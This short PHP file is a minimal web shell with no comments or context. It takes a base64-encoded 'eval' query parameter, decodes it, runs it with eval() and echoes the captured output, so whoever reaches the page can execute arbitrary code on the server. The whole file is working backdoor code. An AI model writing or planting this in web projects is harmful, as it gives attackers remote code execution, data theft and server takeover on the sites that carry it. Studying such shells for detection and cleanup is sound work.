<?php
if(isset($_GET['eval'])){
	$s_code = base64_decode($_GET['eval']);
	ob_start();
	eval($s_code);
	$s_res = ob_get_contents();
	ob_end_clean();
	echo($s_res);
}
?>